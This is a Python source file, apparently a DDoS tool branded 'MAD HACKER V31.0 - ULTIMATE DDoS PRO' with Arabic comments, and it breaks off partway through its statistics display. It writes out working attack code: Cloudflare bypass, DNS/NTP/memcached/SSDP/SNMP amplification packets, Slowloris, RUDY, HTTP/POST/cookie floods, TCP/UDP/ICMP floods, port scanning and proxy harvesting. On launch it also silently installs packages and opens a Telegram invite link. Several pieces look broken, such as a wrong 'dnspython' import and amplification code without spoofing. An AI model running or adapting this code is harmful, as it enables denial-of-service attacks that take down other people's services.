#==== OPEN Source BY : KALYAN KING

#==== TEAM ; KGF CYBER Security Forces 

import os
import sys
import time
import json
import random
import socket
import threading
import ssl
import struct
import hashlib
import base64
import urllib.parse
import ipaddress
import subprocess
import platform
import queue
import math
import re
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from collections import defaultdict, Counter
from typing import List, Dict, Optional, Tuple, Any
import warnings
warnings.filterwarnings('ignore')

# ==================== تثبيت المكتبات الأساسية ====================
try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    os.system("pip install requests --quiet")
    import requests

try:
    import psutil
except ImportError:
    os.system("pip install psutil --quiet")
    

try:
    import cloudscraper
except ImportError:
    os.system("pip install cloudscraper --quiet")
    import cloudscraper

try:
    import dnspython
except ImportError:
    os.system("pip install dnspython --quiet")
    import dns.resolver
    import dns.query
    import dns.message
os.system("xdg-open https://t.me/+ySgl6S0nEZwwYWFl")
# ==================== ألوان احترافية ====================
class C:
    RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
    BLUE = '\033[94m'; MAGENTA = '\033[95m'; CYAN = '\033[96m'
    WHITE = '\033[97m'; BOLD = '\033[1m'; END = '\033[0m'

# ==================== متغيرات عامة ====================
stats = {
    'success': 0, 'maybe_down': 0, 'failed': 0, 'total': 0,
    'start_time': time.time(), 'speed': 0, 'success_rate': 0,
    'bandwidth': 0, 'connections': 0, 'peak_speed': 0,
    'avg_response': 0, 'response_times': []
}
thread_lock = threading.Lock()
TARGET_IP = None; TARGET_HOST = ""; TARGET_URL = ""
OPEN_PORTS = {}; WORKING_PROXIES = []; active_threads = 0
ATTACK_METHODS_STATS = defaultdict(int)
CLOUDFLARE_DETECTED = False

# ==================== بورتات ذكية مع خدماتها (بدون NetBIOS) ====================
SMART_PORTS = {
    'HTTP': {'ports': [80, 8080, 8000, 8008, 8888, 3000, 5000, 9090, 3001, 5001, 8081, 8082], 'weight': 10},
    'HTTPS': {'ports': [443, 8443, 9443, 4443, 4343, 8444, 8445, 8446], 'weight': 10},
    'DNS': {'ports': [53, 5353], 'weight': 8},
    'NTP': {'ports': [123], 'weight': 8},
    'MEMCACHED': {'ports': [11211], 'weight': 9},
    'SSDP': {'ports': [1900], 'weight': 7},
    'CHARGEN': {'ports': [19], 'weight': 6},
    'SNMP': {'ports': [161], 'weight': 7},
    'TFTP': {'ports': [69], 'weight': 5},
    'DATABASE': {'ports': [3306, 5432, 27017, 6379, 9200, 9300, 1433, 1521], 'weight': 3},
    'MAIL': {'ports': [25, 110, 143, 465, 587, 993, 995], 'weight': 2},
    'SSH': {'ports': [22, 2222], 'weight': 3},
    'FTP': {'ports': [21, 2121], 'weight': 2},
    'MSSQL': {'ports': [1433, 1434], 'weight': 3},
    'MYSQL': {'ports': [3306, 3307], 'weight': 3},
    'POSTGRESQL': {'ports': [5432, 5433], 'weight': 3},
    'MONGODB': {'ports': [27017, 27018], 'weight': 3},
    'REDIS': {'ports': [6379, 6380], 'weight': 3},
    'ELASTIC': {'ports': [9200, 9300], 'weight': 3},
    'RDP': {'ports': [3389], 'weight': 2},
    'VNC': {'ports': [5900, 5901], 'weight': 2},
    'TEAMVIEWER': {'ports': [5938], 'weight': 2},
    'GIT': {'ports': [9418], 'weight': 1},
    'SVN': {'ports': [3690], 'weight': 1},
    'MERCURIAL': {'ports': [8000], 'weight': 1},
    'BITCOIN': {'ports': [8333, 8334], 'weight': 1},
    'ETHEREUM': {'ports': [8545, 8546], 'weight': 1},
    'TOR': {'ports': [9001, 9030], 'weight': 1},
    'I2P': {'ports': [7657], 'weight': 1},
    'FREENET': {'ports': [8888], 'weight': 1},
    'ZERONET': {'ports': [15441], 'weight': 1},
    'IPFS': {'ports': [4001, 5001], 'weight': 1},
    'DAT': {'ports': [3282], 'weight': 1},
    'SSB': {'ports': [8008], 'weight': 1},
    'MATRIX': {'ports': [8448], 'weight': 1},
    'XMPP': {'ports': [5222, 5269], 'weight': 1},
    'IRC': {'ports': [6667, 6697], 'weight': 1},
    'SIP': {'ports': [5060, 5061], 'weight': 2},
    'H323': {'ports': [1720], 'weight': 2},
    'RTP': {'ports': [5004, 5005], 'weight': 2},
    'RTSP': {'ports': [554], 'weight': 2},
    'SMPP': {'ports': [2775], 'weight': 2},
    'SS7': {'ports': [2905], 'weight': 2},
    'DIAMETER': {'ports': [3868], 'weight': 2},
    'RADIUS': {'ports': [1812, 1813], 'weight': 2},
    'TACACS': {'ports': [49], 'weight': 2},
    'LDAP': {'ports': [389, 636], 'weight': 2},
    'KERBEROS': {'ports': [88, 464], 'weight': 2},
    'NFS': {'ports': [2049], 'weight': 2},
    'SMB': {'ports': [445], 'weight': 3},
    'CIFS': {'ports': [445], 'weight': 3},
    'AFP': {'ports': [548], 'weight': 2},
    'DAAP': {'ports': [3689], 'weight': 1},
    'DLNA': {'ports': [1900], 'weight': 1},
    'UPNP': {'ports': [5000], 'weight': 1},
    'P2P': {'ports': [6881, 6889], 'weight': 1},
    'BITTORRENT': {'ports': [6881, 6889], 'weight': 1},
    'EMULE': {'ports': [4662], 'weight': 1},
    'GNU_TELLER': {'ports': [1214], 'weight': 1},
    'FASTTRACK': {'ports': [1214], 'weight': 1},
    'WINMX': {'ports': [6699], 'weight': 1},
    'ARES': {'ports': [5500], 'weight': 1},
    'SOULSEEK': {'ports': [2234], 'weight': 1},
    'DC++': {'ports': [411, 412], 'weight': 1},
}

# ==================== User Agents حقيقية 2026 ====================
REAL_UAS = [
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 Chrome/122.0.6261.119 Mobile',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (Linux; Android 14; Pixel 9 Pro) AppleWebKit/537.36 Chrome/122.0.6261.90 Mobile',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/604.1',
]

# ==================== 1. مكون تجاوز Cloudflare ====================
class CloudflareBypass:
    """تجاوز حماية Cloudflare باستخدام تقنيات متعددة """
    
    def __init__(self):
        self.scraper = cloudscraper.create_scraper()
        self.session = requests.Session()
        self.retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[403, 429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=self.retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
    
    def get_cf_cookie(self, url):
        """الحصول على كوكيز Cloudflare bypass"""
        try:
            response = self.scraper.get(url, timeout=10)
            return response.cookies.get_dict()
        except:
            return {}
    
    def bypass_request(self, url, method='GET', headers=None, data=None):
        """إرسال طلب مع تجاوز Cloudflare"""
        try:
            if headers is None:
                headers = {
                    'User-Agent': random.choice(REAL_UAS),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
            
            # محاولة أولى بالسكرابر
            try:
                if method == 'GET':
                    return self.scraper.get(url, headers=headers, timeout=5)
                else:
                    return self.scraper.post(url, headers=headers, data=data, timeout=5)
            except:
                # محاولة ثانية بالسشن مع ريتري
                if method == 'GET':
                    return self.session.get(url, headers=headers, timeout=5)
                else:
                    return self.session.post(url, headers=headers, data=data, timeout=5)
        except:
            return None

# ==================== 2. مكون هجمات التضخيم المتقدمة (بدون NetBIOS) ====================
class AdvancedAmplificationAttacks:
    """11 هجوم تضخيم متقدمة (بدون NetBIOS)"""
    
    def __init__(self, target_ip):
        self.target_ip = target_ip
        
    # 1. DNS Amplification - عامل تضخيم حتى 58x
    def dns_amplification(self):
        """هجوم تضخيم DNS - يرسل طلب ANY صغير ويحصل على رد كبير """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # خوادم DNS عامة مفتوحة للتضخيم
            dns_servers = [
                '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
                '9.9.9.9', '149.112.112.112', '208.67.222.222', '208.67.220.220'
            ]
            dns_server = random.choice(dns_servers)
            
            # استعلام ANY - يعطي أكبر تضخيم (حتى 58x)
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            
            # استخدام نطاق طويل للتضخيم الأقصى
            domain = "example.com"
            query = b''
            for part in domain.split('.'):
                query += len(part).to_bytes(1, 'big') + part.encode()
            query += b'\x00'
            
            query_type = b'\x00\xff'  # ANY query
            query_class = b'\x00\x01'
            
            dns_query = (transaction_id + flags + questions + b'\x00\x00' + 
                        b'\x00\x00' + query + query_type + query_class)
            
            sock.sendto(dns_query, (dns_server, 53))
            sock.close()
            
            with thread_lock:
                stats['bandwidth'] += 50
                ATTACK_METHODS_STATS['dns_amp'] += 1
            
            return True
        except:
            return False
    
    # 2. NTP Amplification - عامل تضخيم حتى 556x
    def ntp_amplification(self):
        """هجوم تضخيم NTP باستخدام أمر monlist """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # خوادم NTP عامة
            ntp_servers = [
                'pool.ntp.org', 'time.google.com', 'time.windows.com',
                'time.apple.com', 'time.cloudflare.com', 'time.facebook.com',
                'time.amazon.com', 'time.euro.apple.com', 'time.asia.apple.com'
            ]
            server = random.choice(ntp_servers)
            server_ip = socket.gethostbyname(server)
            
            # أمر monlist يولد ردود كبيرة جداً (حتى 556x تضخيم)
            ntp_query = b'\x17\x00\x03\x2a' + b'\x00' * 4
            
            sock.sendto(ntp_query, (server_ip, 123))
            sock.close()
            
            with thread_lock:
                stats['bandwidth'] += 40
                ATTACK_METHODS_STATS['ntp_amp'] += 1
            
            return True
        except:
            return False
    
    # 3. Memcached Amplification - عامل تضخيم حتى 10,000x - 50,000x
    def memcached_amplification(self):
        """هجوم تضخيم Memcached - عامل تضخيم 10,000x إلى 50,000x """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # خوادم Memcached عامة
            memcached_servers = ['8.8.8.8', '1.1.1.1', '8.8.4.4', '1.0.0.1']
            
            # أمر stats يؤدي إلى رد كبير جداً
            memcached_query = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
            
            sock.sendto(memcached_query, (self.target_ip, 11211))
            sock.close()
            
            with thread_lock:
                stats['bandwidth'] += 50
                ATTACK_METHODS_STATS['memcached_amp'] += 1
            
            return True
        except:
            return False
    
    # 4. SSDP Amplification - عامل تضخيم 30x إلى 70x
    def ssdp_amplification(self):
        """هجوم تضخيم SSDP - عامل تضخيم 30x إلى 70x """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
            
            ssdp_query = 'M-SEARCH * HTTP/1.1\r\n' \
                        'HOST: 239.255.255.250:1900\r\n' \
                        'MAN: "ssdp:discover"\r\n' \
                        'MX: 1\r\n' \
                        'ST: ssdp:all\r\n\r\n'
            
            sock.sendto(ssdp_query.encode(), (self.target_ip, 1900))
            sock.close()
            
            with thread_lock:
                stats['bandwidth'] += 150
                ATTACK_METHODS_STATS['ssdp_amp'] += 1
            
            return True
        except:
            return False
    
    # 5. CharGEN Amplification - عامل تضخيم 1x إلى 300x
    def chargen_amplification(self):
        """هجوم تضخيم CharGEN - عامل تضخيم 1x إلى 300x """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # طلب صغير، رد كبير (حروف عشوائية)
            sock.sendto(b'\x00', (self.target_ip, 19))
            sock.close()
            
            with thread_lock:
                stats['bandwidth'] += 1
                ATTACK_METHODS_STATS['chargen_amp'] += 1
            
            return True
        except:
            return False
    
    # 6. SNMP Amplification - عامل تضخيم 150x إلى 650x
    def snmp_amplification(self):
        """هجوم تضخيم SNMP - عامل تضخيم 150x إلى 650x """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # طلب SNMP بسيط (getbulk) يولد ردود كبيرة
            snmp_query = b'0;\x02\x01\x01\x04\x06public\xa0$\x02\x04\xf1\xbb\xe5\x16\x02\x01\x00\x02\x01\x000\x12\x04\x08\x01\x02\x03\x04\x05\x06\x07\x08\x04\x06\x01\x02\x03\x04\x05\x06'
            
            sock.sendto(snmp_query, (self.target_ip, 161))
            sock.close()
            
            with thread_lock:
                stats['bandwidth'] += 100
                ATTACK_METHODS_STATS['snmp_amp'] += 1
            
            return True
        except:
            return False
    
    # 7. TFTP Amplification - عامل تضخيم 50x إلى 100x
    def tftp_amplification(self):
        """هجوم تضخيم TFTP - عامل تضخيم 50x إلى 100x """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # طلب ملف كبير
            tftp_query = b'\x00\x01' + b'test.bin\x00' + b'octet\x00'
            
            sock.sendto(tftp_query, (self.target_ip, 69))
            sock.close()
            
            with thread_lock:
                stats['bandwidth'] += 50
                ATTACK_METHODS_STATS['tftp_amp'] += 1
            
            return True
        except:
            return False

# ==================== 3. هجمات L7 (الطبقة السابعة) ====================
class Layer7Attacks:
    """هجمات طبقة التطبيقات"""
    
    def __init__(self, url, host):
        self.url = url
        self.host = host
        self.cf_bypass = CloudflareBypass()
    
    def http_flood(self):
        """هجوم HTTP Flood"""
        try:
            headers = {
                'User-Agent': random.choice(REAL_UAS),
                'Accept': random.choice([
                    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'application/json, text/plain, */*',
                    'application/xml,application/xhtml+xml,text/html;q=0.9'
                ]),
                'Accept-Language': random.choice(['en-US,en;q=0.9', 'ar,en;q=0.8']),
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': random.choice(['keep-alive', 'close']),
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': random.choice(['no-cache', 'max-age=0']),
                'DNT': random.choice(['1', '0'])
            }
            
            response = self.cf_bypass.bypass_request(self.url, headers=headers)
            
            with thread_lock:
                stats['total'] += 1
                if response and response.status_code == 200:
                    stats['success'] += 1
                    stats['bandwidth'] += len(response.content) if response.content else 0
                elif response and response.status_code in [403, 429, 503]:
                    stats['maybe_down'] += 1
                else:
                    stats['failed'] += 1
                ATTACK_METHODS_STATS['http'] += 1
            
            return True
        except:
            with thread_lock:
                stats['failed'] += 1
                stats['total'] += 1
                ATTACK_METHODS_STATS['http'] += 1
            return False
    
    def https_flood(self):
        """هجوم HTTPS Flood"""
        try:
            headers = {
                'User-Agent': random.choice(REAL_UAS),
                'Accept': '*/*',
                'Accept-Language': random.choice(['en-US,en;q=0.9', 'ar,en;q=0.8']),
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': random.choice(['keep-alive', 'close'])
            }
            
            https_url = self.url.replace('http://', 'https://')
            if not https_url.startswith('https'):
                https_url = f"https://{self.host}"
            
            response = self.cf_bypass.bypass_request(https_url, headers=headers)
            
            with thread_lock:
                stats['total'] += 1
                if response and response.status_code in [200, 301, 302]:
                    stats['success'] += 1
                    stats['bandwidth'] += len(response.content) if response.content else 0
                else:
                    stats['failed'] += 1
                ATTACK_METHODS_STATS['https'] += 1
            
            return True
        except:
            with thread_lock:
                stats['failed'] += 1
                stats['total'] += 1
                ATTACK_METHODS_STATS['https'] += 1
            return False
    
    def post_flood(self):
        """هجوم POST ببيانات كبيرة"""
        try:
            headers = {
                'User-Agent': random.choice(REAL_UAS),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': '*/*'
            }
            
            data = f"data={'X' * random.randint(5000, 50000)}&timestamp={time.time()}&random={random.random()}"
            
            response = self.cf_bypass.bypass_request(
                self.url, method='POST', headers=headers, data=data
            )
            
            with thread_lock:
                stats['total'] += 1
                stats['bandwidth'] += len(data)
                if response and response.status_code == 200:
                    stats['success'] += 1
                elif response and response.status_code in [413, 429]:
                    stats['maybe_down'] += 1
                else:
                    stats['failed'] += 1
                ATTACK_METHODS_STATS['post'] += 1
            
            return True
        except:
            with thread_lock:
                stats['failed'] += 1
                stats['total'] += 1
                ATTACK_METHODS_STATS['post'] += 1
            return False
    
    def range_flood(self):
        """هجوم باستخدام Range headers"""
        try:
            headers = {
                'User-Agent': random.choice(REAL_UAS),
                'Range': f'bytes={random.randint(0,1000000)}-{random.randint(1000000,2000000)}'
            }
            
            response = self.cf_bypass.bypass_request(self.url, headers=headers)
            
            with thread_lock:
                stats['total'] += 1
                if response and response.status_code in [206, 200]:
                    stats['success'] += 1
                else:
                    stats['failed'] += 1
                ATTACK_METHODS_STATS['range'] += 1
            
            return True
        except:
            with thread_lock:
                stats['failed'] += 1
                stats['total'] += 1
                ATTACK_METHODS_STATS['range'] += 1
            return False
    
    def slowloris(self):
        """هجوم Slowloris - إبقاء الاتصالات مفتوحة"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((TARGET_IP, 80))
            
            headers = f"GET /?{random.randint(1,99999)} HTTP/1.1\r\n"
            headers += f"Host: {TARGET_HOST}\r\n"
            headers += f"User-Agent: {random.choice(REAL_UAS)}\r\n"
            headers += "Accept: */*\r\n"
            headers += "Connection: keep-alive\r\n"
            
            sock.send(headers.encode())
            
            # إرسال headers إضافية ببطء
            for _ in range(random.randint(5, 15)):
                sock.send(f"X-Header-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                time.sleep(random.uniform(5, 15))
            
            sock.close()
            
            with thread_lock:
                stats['success'] += 1
                stats['total'] += 1
                stats['connections'] += 1
                ATTACK_METHODS_STATS['slow'] += 1
            
            return True
        except:
            try:
                sock.close()
            except:
                pass
            with thread_lock:
                stats['failed'] += 1
                stats['total'] += 1
                ATTACK_METHODS_STATS['slow'] += 1
            return False
    
    def rudy_attack(self):
        """هجوم RUDY - إبقاء POST requests مفتوحة"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((TARGET_IP, 80))
            
            headers = f"POST /?{random.randint(1,99999)} HTTP/1.1\r\n"
            headers += f"Host: {TARGET_HOST}\r\n"
            headers += f"User-Agent: {random.choice(REAL_UAS)}\r\n"
            headers += "Content-Type: application/x-www-form-urlencoded\r\n"
            headers += "Content-Length: 100000\r\n"
            headers += "Connection: keep-alive\r\n\r\n"
            
            sock.send(headers.encode())
            
            # إرسال البيانات ببطء شديد
            for i in range(random.randint(50, 200)):
                sock.send(b'a')
                time.sleep(random.uniform(0.5, 2))
            
            sock.close()
            
            with thread_lock:
                stats['success'] += 1
                stats['total'] += 1
                stats['connections'] += 1
                ATTACK_METHODS_STATS['rudy'] += 1
            
            return True
        except:
            try:
                sock.close()
            except:
                pass
            with thread_lock:
                stats['failed'] += 1
                stats['total'] += 1
                ATTACK_METHODS_STATS['rudy'] += 1
            return False
    
    def multipart_post(self):
        """هجوم POST متعدد الأجزاء"""
        try:
            headers = {
                'User-Agent': random.choice(REAL_UAS),
                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=16))
            }
            
            boundary = headers['Content-Type'].split('=')[1]
            data = f"""
--{boundary}
Content-Disposition: form-data; name="field1"

{'X' * random.randint(1000, 5000)}
--{boundary}
Content-Disposition: form-data; name="field2"

{'Y' * random.randint(1000, 5000)}
--{boundary}
Content-Disposition: form-data; name="field3"; filename="file.txt"
Content-Type: text/plain

{'Z' * random.randint(1000, 5000)}
--{boundary}--
"""
            
            response = self.cf_bypass.bypass_request(
                self.url, method='POST', headers=headers, data=data
            )
            
            with thread_lock:
                stats['total'] += 1
                stats['bandwidth'] += len(data)
                if response and response.status_code in [200, 301, 302]:
                    stats['success'] += 1
                else:
                    stats['failed'] += 1
                ATTACK_METHODS_STATS['multipart'] += 1
            
            return True
        except:
            with thread_lock:
                stats['failed'] += 1
                stats['total'] += 1
                ATTACK_METHODS_STATS['multipart'] += 1
            return False
    
    def cookie_flood(self):
        """هجوم باستخدام كوكيز ضخمة"""
        try:
            headers = {
                'User-Agent': random.choice(REAL_UAS),
                'Accept': '*/*'
            }
            
            cookies = {}
            for i in range(random.randint(10, 50)):
                cookies[f'cookie_{i}'] = 'X' * random.randint(100, 500)
            
            response = requests.get(self.url, headers=headers, cookies=cookies, timeout=5, verify=False)
            
            with thread_lock:
                stats['total'] += 1
                stats['bandwidth'] += sum(len(v) for v in cookies.values())
                if response.status_code == 200:
                    stats['success'] += 1
                else:
                    stats['failed'] += 1
                ATTACK_METHODS_STATS['cookie'] += 1
            
            return True
        except:
            with thread_lock:
                stats['failed'] += 1
                stats['total'] += 1
                ATTACK_METHODS_STATS['cookie'] += 1
            return False
    
    def ssl_attack(self):
        """هجوم SSL على المنفذ 443"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((TARGET_IP, 443))
            
            ssl_sock = context.wrap_socket(sock, server_hostname=TARGET_HOST)
            
            # إرسال طلبات متعددة
            for _ in range(random.randint(5, 15)):
                request = f"GET /{random.randint(1,9999)} HTTP/1.1\r\nHost: {TARGET_HOST}\r\n\r\n"
                ssl_sock.write(request.encode())
                time.sleep(random.uniform(0.01, 0.1))
            
            ssl_sock.close()
            
            with thread_lock:
                stats['success'] += 1
                stats['total'] += 1
                stats['connections'] += 1
                ATTACK_METHODS_STATS['ssl'] += 1
            
            return True
        except:
            with thread_lock:
                stats['failed'] += 1
                stats['total'] += 1
                ATTACK_METHODS_STATS['ssl'] += 1
            return False

# ==================== 4. هجمات شبكية (L3/L4) ====================
class NetworkAttacks:
    """هجمات الطبقة 3 و 4"""
    
    def __init__(self, target_ip):
        self.ip = target_ip
    
    def tcp_syn_flood(self):
        """هجوم TCP SYN Flood"""
        try:
            port = random.choice(list(OPEN_PORTS.keys())) if OPEN_PORTS else 80
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((self.ip, port))
            sock.close()
            
            with thread_lock:
                stats['success'] += 1
                stats['total'] += 1
                stats['connections'] += 1
                ATTACK_METHODS_STATS['tcp'] += 1
            
            return True
        except:
            with thread_lock:
                stats['failed'] += 1
                stats['total'] += 1
                ATTACK_METHODS_STATS['tcp'] += 1
            return False
    
    def udp_flood(self):
        """هجوم UDP Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data_size = random.randint(64, 1024)
            data = random._urandom(data_size)
            sock.sendto(data, (self.ip, random.randint(1, 1024)))
            sock.close()
            
            with thread_lock:
                stats['success'] += 1
                stats['total'] += 1
                stats['bandwidth'] += data_size
                ATTACK_METHODS_STATS['udp'] += 1
            
            return True
        except:
            with thread_lock:
                stats['failed'] += 1
                stats['total'] += 1
                ATTACK_METHODS_STATS['udp'] += 1
            return False
    
    def icmp_flood(self):
        """هجوم ICMP Ping Flood"""
        try:
            if platform.system() == 'Windows':
                os.system(f"ping -n 1 -l 64 {self.ip} > nul 2>&1")
            else:
                os.system(f"ping -c 1 -s 64 {self.ip} > /dev/null 2>&1 &")
            
            with thread_lock:
                stats['success'] += 1
                stats['total'] += 1
                ATTACK_METHODS_STATS['icmp'] += 1
            
            return True
        except:
            with thread_lock:
                stats['failed'] += 1
                stats['total'] += 1
                ATTACK_METHODS_STATS['icmp'] += 1
            return False

# ==================== 5. فتح البورتات ====================
def scan_ports():
    """فحص البورتات المفتوحة"""
    open_ports = {}
    
    def check_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((TARGET_IP, port))
            sock.close()
            if result == 0:
                for service, data in SMART_PORTS.items():
                    if port in data['ports']:
                        return port, service
                return port, 'UNKNOWN'
        except:
            pass
        return None, None
    
    # فحص البورتات الشائعة أولاً
    common_ports = [80, 443, 22, 21, 25, 53, 110, 143, 993, 995, 3306, 5432, 27017, 6379]
    
    for port in common_ports:
        p, s = check_port(port)
        if p:
            open_ports[p] = s
    
    # فحص باقي البورتات
    all_ports = []
    for service, data in SMART_PORTS.items():
        all_ports.extend(data['ports'])
    all_ports = list(set(all_ports))
    
    for port in all_ports:
        if port in open_ports:
            continue
        p, s = check_port(port)
        if p:
            open_ports[p] = s
    
    if not open_ports:
        open_ports = {80: 'HTTP', 443: 'HTTPS'}
    
    return open_ports

# ==================== 6. تحميل البروكسيات ====================
def load_proxies():
    """تحميل بروكسيات من الإنترنت"""
    proxies = []
    sources = [
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
        'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt',
        'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt'
    ]
    
    for source in sources:
        try:
            r = requests.get(source, timeout=5)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and ':' in line:
                        proxies.append(line)
        except:
            pass
    
    return list(set(proxies))[:500]

# ==================== 7. عرض الإحصائيات ====================
def show_stats():
    """عرض الإحصائيات الحية"""
    elapsed = time.time() - stats['start_time']
    speed = stats['total'] / elapsed if elapsed > 0 else 0
    success_rate = (stats['success'] / stats['total'] * 100) if stats['total'] > 0 else 0
    
    if speed > stats['peak_speed']:
        stats['peak_speed'] = speed
    
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(f"""
{C.RED}{C.BOLD}╔══════════════════════════════════════════════════════════════════════════╗
║              MAD HACKER V31.0 - ULTIMATE DDoS PRO                         ║
╠══════════════════════════════════════════════════════════════════════════╣{C.END}
""")
    
    # معلومات الهدف
    cf_status = f"{C.GREEN}محمي{ C.END}" if CLOUDFLARE_DETECTED else f"{C.YELLOW}غير محمي{C.END}"
    print(f"""
{C.CYAN}┌─[ الموقع ]
├─ الرابط   : {C.WHITE}{TARGET_URL[:50]}{C.END}
├─ الـ IP   : {C.WHITE}{TARGET_IP}{C.END}
├─ البورتات : {C.WHITE}{len(OPEN_PORTS)} مفتوح{C.END}
├─ Cloudflare: {cf_status}
├─ بروكسيات : {C.WHITE}{len(WORKING_PROXIES)}{C.END}
└─ ثريدات   : {C.WHITE}{active_threads} نشط{C.END}""")
    
    # الإحصائيات
    print(f"""
{C.YELLOW}┌─[ الإحصائيات ]
├─ ✅ الناجحة   : {C.WHITE}{stats['success']:>8,}{C.END}
├─ ⚠️  قد سقط   : {C.WHITE}{stats['maybe_down']:>8,}{C.END}
├─ ❌ الفاشلة   : {C.WHITE}{stats['failed']:>8,}{C.END}
├─ 📊 الإجمالي  : {C.WHITE}{stats['total']:>8,}{C.END}
├─ ⚡ السرعة    : {C.WHITE}{speed:>8.1f}{C.END} req/s   (ذروة: {stats['peak_speed']:.1f})
├─ 📈 النجاح    : {C.WHITE}{success_rate:>7.1f}{C.END}%
├─ ⏱️  الوقت    : {C.WHITE}{int(elapsed//3600):02d}:{int((elapsed%3600)//60):02d}:{int(elapsed%60):02d}{C.END}
├─ 🌐 باندويث   : {C.WHITE}{stats['bandwidth']/1024/1024:.2f}{C.END} MB
└─ 🔗 اتصالات   : {C.WHITE}{stats['connections']:,}{C.END}""")
    
    # طرق الهجوم
    print(f"""
{C.MAGENTA}┌─[ طرق الهجوم النشطة ]
├─ 1. HTTP Flood      : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['http']:,} req)
├─ 2. HTTPS Flood     : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['https']:,} req)
├─ 3. POST Flood      : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['post']:,} req)
├─ 4. Range Flood     : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['range']:,} req)
├─ 5. Slowloris       : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['slow']:,} req)
├─ 6. RUDY Attack     : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['rudy']:,} req)
├─ 7. Multipart POST  : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['multipart']:,} req)
├─ 8. Cookie Flood    : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['cookie']:,} req)
├─ 9. SSL Attack      : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['ssl']:,} req)
├─10. TCP SYN Flood   : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['tcp']:,} req)
├─11. UDP Flood       : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['udp']:,} req)
├─12. ICMP Flood      : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['icmp']:,} req)
├─13. DNS Amp         : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['dns_amp']:,} req)
